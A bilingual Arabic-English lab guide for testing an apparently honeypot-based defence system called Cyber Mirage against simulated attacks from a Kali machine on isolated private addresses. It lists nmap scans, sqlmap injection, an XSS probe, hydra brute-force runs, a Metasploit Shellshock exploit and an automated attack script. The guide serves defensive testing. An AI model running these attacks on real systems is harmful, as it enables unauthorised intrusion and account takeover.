# 🎯 إعداد بيئة الاختبار مع هاكر حقيقي
## Real Penetration Testing Setup Guide

**التاريخ:** 26 أكتوبر 2025  
**الحالة:** جاهز للاختبار الحقيقي  
**الهدف:** اختبار Cyber Mirage ضد هجمات حقيقية

---

## 🏗️ **البيئة المطلوبة (3 خيارات):**

### **✅ الخيار 1: بيئة محلية آمنة (الأسهل - 30 دقيقة)**

```
┌─────────────────────────────────────────────────┐
│  Your Machine (Cyber Mirage Defender)          │
│  ├─ Windows 10/11                               │
│  ├─ IP: 192.168.1.100                          │
│  └─ Running: Cyber Mirage + Honeypots          │
└─────────────────────────────────────────────────┘
              ↕ (Network)
┌─────────────────────────────────────────────────┐
│  Attacker Machine (Kali Linux VM)              │
│  ├─ VirtualBox/VMware                           │
│  ├─ IP: 192.168.1.200                          │
│  └─ Tools: nmap, metasploit, sqlmap            │
└─────────────────────────────────────────────────┘
```

**المميزات:**
- ✅ آمن تماماً (شبكة معزولة)
- ✅ سريع التجهيز
- ✅ تحكم كامل
- ✅ يناسب Demo وتجارب

**الخطوات:**

#### 1. جهز Attacker Machine (Kali Linux):
```bash
# Download Kali Linux VM
# https://www.kali.org/get-kali/#kali-virtual-machines

# في VirtualBox/VMware:
# - Network: Bridged Adapter (نفس شبكة جهازك)
# - RAM: 4GB+
# - Disk: 30GB+
```

#### 2. جهز Cyber Mirage (جهازك):
```powershell
# شغل Dashboard
cd A:\cyber_mirage
.\venv\Scripts\python.exe -m streamlit run src/dashboard/streamlit_app.py

# في terminal تاني - شغل Honeypots
.\venv\Scripts\python.exe src/environment/base_env.py

# في terminal تالت - شغل AI Defense
.\venv\Scripts\python.exe src/training/test.py
```

#### 3. اختبار الاتصال:
```powershell
# من جهازك - اعرف IP بتاعك
ipconfig
# مثال: 192.168.1.100

# من Kali - اختبر الاتصال
ping 192.168.1.100
```

---

### **✅ الخيار 2: Docker Isolated Network (الأفضل - ساعة)**

```
┌────────────────────────────────────────┐
│  Docker Network: cyber_mirage_net      │
│                                        │
│  ┌──────────────────┐                 │
│  │ Cyber Mirage     │                 │
│  │ Container        │                 │
│  │ IP: 172.18.0.10  │◄────────────────┤
│  └──────────────────┘                 │
│           ▲                            │
│           │ (monitored)                │
│           ▼                            │
│  ┌──────────────────┐                 │
│  │ Attacker         │                 │
│  │ Container        │                 │
│  │ IP: 172.18.0.20  │                 │
│  └──────────────────┘                 │
└────────────────────────────────────────┘
```

**المميزات:**
- ✅ معزول تماماً
- ✅ سهل الإعادة
- ✅ احترافي
- ✅ يناسب التطوير

**الخطوات:**

```powershell
# 1. أنشئ Docker network
docker network create --subnet=172.18.0.0/16 cyber_mirage_net

# 2. شغل Cyber Mirage
docker run -d --name cyber_mirage `
  --network cyber_mirage_net `
  --ip 172.18.0.10 `
  -p 8501:8501 `
  -v A:\cyber_mirage:/app `
  python:3.11 `
  bash -c "cd /app && pip install -r requirements.txt && streamlit run src/dashboard/streamlit_app.py"

# 3. شغل Attacker container
docker run -it --name attacker `
  --network cyber_mirage_net `
  --ip 172.18.0.20 `
  kalilinux/kali-rolling `
  bash

# داخل Attacker container
apt update && apt install -y nmap metasploit-framework sqlmap hydra
```

---

### **✅ الخيار 3: Cloud Isolated Environment (للجدية - يوم)**

```
┌─────────────────────────────────────────────────┐
│  AWS/Azure/GCP - Isolated VPC                   │
│                                                 │
│  ┌─────────────────┐    ┌──────────────────┐  │
│  │ Cyber Mirage    │    │ Monitoring       │  │
│  │ EC2/VM          │───►│ CloudWatch/Logs  │  │
│  │ 10.0.1.10       │    └──────────────────┘  │
│  └─────────────────┘                           │
│          ▲                                      │
│          │ (Internet Gateway - Controlled)     │
│          ▼                                      │
│  ┌─────────────────┐                           │
│  │ Attacker VM     │                           │
│  │ 10.0.2.10       │                           │
│  └─────────────────┘                           │
└─────────────────────────────────────────────────┘
```

**المميزات:**
- ✅ Professional setup
- ✅ Scalable
- ✅ Real-world scenario
- ✅ يناسب Production testing

---

## 🎯 **سيناريوهات الهجوم (Attack Scenarios):**

### **السيناريو 1: Reconnaissance (استطلاع) - 10 دقائق**

**من Kali Linux:**
```bash
# 1. Network Scan
nmap -sV -sC 192.168.1.100

# 2. Service Detection
nmap -p- 192.168.1.100

# 3. OS Detection
nmap -O 192.168.1.100

# 4. Vulnerability Scan
nmap --script vuln 192.168.1.100
```

**المتوقع من Cyber Mirage:**
```
✅ يكتشف الـ scan
✅ يسجل IP المهاجم
✅ يوجهه لـ honeypot
✅ يبدأ profiling
```

---

### **السيناريو 2: Web Attack (هجوم ويب) - 15 دقيقة**

**من Kali Linux:**
```bash
# 1. SQL Injection
sqlmap -u "http://192.168.1.100:8080/login" --forms --batch

# 2. Directory Bruteforce
dirb http://192.168.1.100:8080

# 3. XSS Testing
curl "http://192.168.1.100:8080/search?q=<script>alert('xss')</script>"

# 4. Login Bruteforce
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

**المتوقع من Cyber Mirage:**
```
✅ يكتشف SQL injection attempts
✅ يقدم fake database
✅ يسجل كل الـ payloads
✅ يغير الـ responses ديناميكياً
```

---

### **السيناريو 3: SSH/FTP Bruteforce - 10 دقائق**

**من Kali Linux:**
```bash
# 1. SSH Bruteforce
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# 2. FTP Bruteforce
hydra -l admin -P passwords.txt ftp://192.168.1.100

# 3. Successful Login (fake)
ssh admin@192.168.1.100
# (سيدخل لـ honeypot)
```

**المتوقع من Cyber Mirage:**
```
✅ يسمح بالدخول بعد محاولات
✅ يوفر fake shell
✅ يسجل كل الأوامر
✅ يقدم fake sensitive files
```

---

### **السيناريو 4: Exploitation (استغلال) - 20 دقيقة**

**من Kali Linux:**
```bash
# 1. Start Metasploit
msfconsole

# 2. Scan for vulnerabilities
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
run

# 3. Try exploits
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST 192.168.1.100
set LHOST 192.168.1.200
exploit

# 4. Post-exploitation
# (إذا "نجح" - سيكون في honeypot)
```

**المتوقع من Cyber Mirage:**
```
✅ يتظاهر بالثغرة
✅ يعطي fake shell
✅ يجمع معلومات عن الـ exploit
✅ ينشئ IOCs
```

---

## 📊 **المؤشرات المطلوب مراقبتها:**

### **في Dashboard (http://localhost:8501):**

```
┌─────────────────────────────────────────────┐
│  Real-time Monitoring                       │
├─────────────────────────────────────────────┤
│  ✓ Active Attacks: 1                        │
│  ✓ Attacker IP: 192.168.1.200              │
│  ✓ Attack Type: Port Scan → SQL Injection  │
│  ✓ Honeypots Triggered: 3                   │
│  ✓ Commands Logged: 47                      │
│  ✓ IOCs Extracted: 12                       │
│  ✓ Threat Level: 8/10                       │
└─────────────────────────────────────────────┘
```

### **في Logs:**

```powershell
# شوف الـ logs الحية
Get-Content A:\cyber_mirage\data\logs\attacks.log -Wait -Tail 50

# شوف attacker profiles
Get-Content A:\cyber_mirage\data\logs\attacker_*.json | ConvertFrom-Json
```

---

## 🔬 **سكريبت اختبار تلقائي:**

خلينا نعمل سكريبت يشغل كل الهجمات دي تلقائي:

```bash
#!/bin/bash
# auto_attack.sh - Automated attack script for testing

TARGET="192.168.1.100"
LOG_FILE="attack_results.txt"

echo "🎯 Starting Automated Attack on $TARGET" | tee $LOG_FILE
echo "================================================" | tee -a $LOG_FILE

# Phase 1: Reconnaissance
echo "[*] Phase 1: Reconnaissance" | tee -a $LOG_FILE
nmap -sV $TARGET | tee -a $LOG_FILE
sleep 5

# Phase 2: Port Scanning
echo "[*] Phase 2: Full Port Scan" | tee -a $LOG_FILE
nmap -p- $TARGET | tee -a $LOG_FILE
sleep 5

# Phase 3: Service Enumeration
echo "[*] Phase 3: Service Enumeration" | tee -a $LOG_FILE
nmap -sV -sC $TARGET | tee -a $LOG_FILE
sleep 5

# Phase 4: HTTP Testing
echo "[*] Phase 4: HTTP Directory Scan" | tee -a $LOG_FILE
dirb http://$TARGET:8080 -S | tee -a $LOG_FILE
sleep 5

# Phase 5: SQL Injection
echo "[*] Phase 5: SQL Injection Test" | tee -a $LOG_FILE
sqlmap -u "http://$TARGET:8080/login" --forms --batch | tee -a $LOG_FILE
sleep 5

# Phase 6: SSH Bruteforce (limited)
echo "[*] Phase 6: SSH Bruteforce (10 attempts)" | tee -a $LOG_FILE
hydra -l admin -p password123 ssh://$TARGET | tee -a $LOG_FILE

echo "================================================" | tee -a $LOG_FILE
echo "✅ Attack simulation complete!" | tee -a $LOG_FILE
echo "📊 Check $LOG_FILE for details" | tee -a $LOG_FILE
```

---

## 📋 **Checklist قبل البدء:**

### **على جهازك (Defender):**
```
☐ Cyber Mirage شغال
☐ Dashboard شغال (localhost:8501)
☐ Honeypots جاهزة
☐ Logging شغال
☐ AI Models محملة
☐ IP معروف (ipconfig)
```

### **على جهاز الهاكر (Attacker):**
```
☐ Kali Linux شغالة
☐ Network متصلة
☐ Tools مركبة (nmap, metasploit, sqlmap)
☐ IP معروف
☐ Ping للـ Target شغال
```

---

## 🎬 **خطوات التشغيل (Step-by-Step):**

### **1. التجهيز (5 دقائق):**
```powershell
# Terminal 1: Dashboard
cd A:\cyber_mirage
.\venv\Scripts\python.exe -m streamlit run src/dashboard/streamlit_app.py

# Terminal 2: Environment
.\venv\Scripts\python.exe src/environment/base_env.py

# Terminal 3: Monitoring
Get-Content data\logs\*.log -Wait -Tail 20
```

### **2. بدء الهجوم (من Kali):**
```bash
# Terminal 1: Recon
nmap -sV 192.168.1.100

# Terminal 2: Attack
sqlmap -u "http://192.168.1.100:8080/login" --forms

# Terminal 3: Exploitation
msfconsole
```

### **3. المراقبة (على جهازك):**
```
1. افتح Dashboard: http://localhost:8501
2. شوف Real-time attacks
3. راقب Logs
4. شوف AI decisions
```

---

## 📊 **النتائج المتوقعة:**

### **✅ نجاح التجربة يعني:**

```
1. ✅ النظام كشف الهجوم (Detection)
2. ✅ وجّه المهاجم للـ honeypot (Redirection)
3. ✅ سجل كل الأنشطة (Logging)
4. ✅ استخرج IOCs (Intelligence)
5. ✅ عمل profile للمهاجم (Profiling)
6. ✅ حمى الـ production assets (Protection)
```

### **📈 المؤشرات الكمية:**

```
• Detection Rate: >95%
• Response Time: <1 second
• False Positives: <5%
• Data Collected: 100% of interactions
• IOCs Extracted: >10 per attack
• Attacker Engagement Time: >5 minutes
```

---

## 🎓 **Tips للحصول على أفضل نتائج:**

### **1. ابدأ بسيط:**
```
اليوم 1: Port scan + Service detection
اليوم 2: Web attacks (SQL, XSS)
اليوم 3: Bruteforce + Exploitation
اليوم 4: Advanced attacks
```

### **2. وثق كل حاجة:**
```
- خد screenshots
- سجل الفيديو
- احفظ الـ logs
- اعمل comparison قبل/بعد
```

### **3. جرب سيناريوهات مختلفة:**
```
✓ Script kiddie (automated tools)
✓ Advanced attacker (manual exploitation)
✓ APT simulation (persistent attack)
✓ Insider threat
```

---

## 🚨 **تحذيرات مهمة:**

```
⚠️ استخدم بيئة معزولة فقط
⚠️ لا تختبر على production
⚠️ خد موافقة قانونية
⚠️ وثق كل حاجة
⚠️ backup قبل البدء
```

---

## 📞 **جاهز للبدء؟**

**أقترح نبدأ بـ:**
1. ✅ Setup Virtual Lab (30 دقيقة)
2. ✅ Run Simple Scan (5 دقائق)
3. ✅ Observe Results (10 دقائق)
4. ✅ Full Attack (ساعة)

**عايز تبدأ بأنهي خيار؟** 🎯
